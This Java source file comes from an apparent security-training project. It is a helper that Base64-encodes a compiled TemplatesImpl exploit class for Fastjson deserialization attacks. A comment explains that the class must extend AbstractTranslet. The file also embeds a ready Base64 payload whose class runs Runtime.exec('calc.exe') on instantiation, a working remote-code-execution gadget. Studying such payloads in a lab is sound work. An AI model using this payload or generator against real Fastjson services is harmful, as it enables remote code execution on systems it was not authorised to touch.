package com.madaha.codesecone.controller.AdvancedAttack.deserialize.components.FastjsonExploit;


import org.apache.commons.codec.binary.Base64;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CreateClassByteCode_Fastjson {

    public static void main(String[] args) throws Exception{

        System.out.println();

        // 注意这里的exp是有要求的，想要使用TemplatesImpl进行Exploit，那就必须要继承AbstractTranslet！！！
        String path = "C:\\Users\\ThreatBook\\IdeaProjects\\CodeSecOne\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\components\\Exploit\\TemplatesImpl_Exploit.class";
//        String path = "C:\\Users\\ThreatBook\\IdeaProjects\\CodeSecOne\\src\\main\\resources\\static\\evil\\jndiRCE\\Exploit\\Exploit.class";
//        String path = "C:\\Users\\ThreatBook\\IdeaProjects\\CodeSecOne\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\CommonCollections\\TemplatesImpl_CC2.java";

        File f = new File(path);

        if (f.exists() && !f.isDirectory()){
            byte[] data = Files.readAllBytes(Paths.get(path));
            System.out.println(new String(Base64.encodeBase64(data)));
        } else {
            System.out.println("文件路径错误！！！");
        }

/**
 yv66vgAAADQALwoACQAWCgAXABgIABkKABcAGgkAGwAcCAAdCgAeAB8HACAHACEBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAKRXhjZXB0aW9ucwcAIgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAY8aW5pdD4BAAMoKVYHACMBAApTb3VyY2VGaWxlAQAaVGVtcGxhdGVzSW1wbF9FeHBsb2l0LmphdmEMABEAEgcAJAwAJQAmAQAIY2FsYy5leGUMACcAKAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuAQAVVGVtcGxhdGVzSW1wbF9FeHBsb2l0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACAAJAAAAAAADAAEACgALAAIADAAAABkAAAADAAAAAbEAAAABAA0AAAAGAAEAAAAOAA4AAAAEAAEADwABAAoAEAACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAAEQAOAAAABAABAA8AAQARABIAAgAMAAAAOgACAAEAAAAWKrcAAbgAAhIDtgAEV7IABRIGtgAHsQAAAAEADQAAABIABAAAABMABAAVAA0AFgAVABcADgAAAAQAAQATAAEAFAAAAAIAFQ==
*/

    }
}
